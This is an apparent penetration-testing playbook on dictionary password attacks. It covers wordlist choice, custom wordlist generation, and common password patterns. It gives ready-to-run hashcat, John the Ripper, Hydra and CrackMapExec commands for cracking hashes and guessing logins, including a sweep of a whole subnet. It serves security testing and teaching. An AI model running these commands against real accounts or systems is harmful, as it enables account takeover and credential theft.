# Password Attacks — Dictionary Attack

## When this applies

- Online authentication endpoint without strong rate limiting (after fingerprinting).
- Offline hash cracking when the user population is likely to use real-world passwords.
- Custom wordlist creation when the target has a niche jargon / vocabulary.

## Technique

Use pre-compiled wordlists of likely passwords (vs all possible combinations of brute force). 80% of users use passwords from public breach corpora, so dictionary attacks succeed quickly when properly tuned.

## Steps

### 1. Wordlist selection

| Wordlist | Size | Use |
|---|---|---|
| `rockyou.txt` | 14M | Generic passwords, English |
| `SecLists/.../10k-most-common.txt` | 10K | Quick first-pass |
| `SecLists/Common-Credentials/best110.txt` | 110 | Manual / first-attempt |
| CrackStation full wordlist | 1.5B | Deep crack |
| HIBP top 10K | 10K | Known-leaked, high hit rate |

### 2. Custom wordlist generation

**CeWL — spider target website for vocabulary:**
```bash
cewl -d 2 -m 5 -w wordlist.txt https://target.com
```

**Crunch — pattern-based:**
```bash
crunch 8 8 -t pass%%%% -o wordlist.txt
# Generates: pass0000, pass0001, ..., pass9999
```

**CUPP — interactive profile-based:**
```bash
python3 cupp.py -i
# Asks for first name, last name, DOB, partner name, pet, year — generates personalized wordlist
```

**Combine wordlists:**
```bash
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt
```

**Apply mutations (John rules):**
```bash
john --wordlist=words.txt --rules --stdout > mutated.txt
```

### 3. Common password patterns

| Pattern | Example |
|---|---|
| Company + year | `Company2024` |
| Name + birthdate | `John1990` |
| Seasonal | `Summer2024!` |
| Keyboard walk | `Qwerty123`, `1qaz2wsx`, `!QAZ@WSX` |
| Leet-speak | `P@ssw0rd`, `S3cur1ty!` |

### 4. Year variant testing

When you find a credential in logs/configs/old backup that doesn't authenticate, the year was likely different at recording time. Try ±2 years from current:

```bash
for year in $(seq 2022 2027); do
  echo "${base_password/2025/$year}"
done > variants.txt

nxc smb DC_IP -u username -p variants.txt --no-bruteforce
```

Common in IdentitySync logs, service-config traces, old backup scripts, EventViewer exports.

### 5. Hashcat dictionary attack

```bash
# Basic
hashcat -m 0 hashes.txt rockyou.txt              # MD5
hashcat -m 1000 hashes.txt rockyou.txt           # NTLM
hashcat -m 1800 hashes.txt rockyou.txt           # SHA-512 crypt
hashcat -m 3200 hashes.txt rockyou.txt           # bcrypt

# With rules
hashcat -m 0 hashes.txt rockyou.txt -r rules/best64.rule
hashcat -m 0 hashes.txt rockyou.txt -r rules/d3ad0ne.rule

# Combinator (two wordlists)
hashcat -a 1 -m 0 hashes.txt words1.txt words2.txt

# Hybrid (wordlist + mask suffix)
hashcat -a 6 -m 0 hashes.txt rockyou.txt ?d?d?d?d
```

### 6. John the Ripper dictionary attack

```bash
john --wordlist=rockyou.txt hashes.txt
john --wordlist=rockyou.txt --rules hashes.txt
john --show hashes.txt
```

### 7. Online dictionary attack

```bash
# Hydra against web form
hydra -l admin -P common-passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"

# CrackMapExec for SMB / RDP / WinRM / MSSQL / SSH
crackmapexec smb 192.168.1.0/24 -u admin -p rockyou.txt
```

### 8. Targeted dictionaries for app/CMS

- WordPress: `wpscan --passwords rockyou.txt`
- Drupal: drupwn / Hydra
- Magento: m1-magento exploit modules
- Joomla: joomscan + joomla-specific lists

## Verifying success

- Hashcat output shows `<hash>:<password>`.
- `john --show` lists cracked entries.
- Online: 200 + session cookie / valid response.

## Common pitfalls

- Hash type mismatch — always run `hashid` first to identify.
- bcrypt/scrypt are slow on CPU; use GPU for tractable runtimes.
- Online dictionary attacks trigger account lockout — pair with `password-spraying.md` for safer pattern.
- Custom wordlists outperform generic ones for targeted attacks.

## Tools

- Hashcat (`-m` mode per hash type), John the Ripper, hashcat-utils.
- CeWL (wordlist generator), Crunch (combinatorial), CUPP (profile-based).
- SecLists / CrackStation / HIBP wordlists.
- Hydra / CrackMapExec for online.

## References

- MITRE ATT&CK T1110.002 (Password Cracking).
- CWE-521 (Weak Password Requirements).
- SecLists: https://github.com/danielmiessler/SecLists
- HIBP: https://haveibeenpwned.com/Passwords
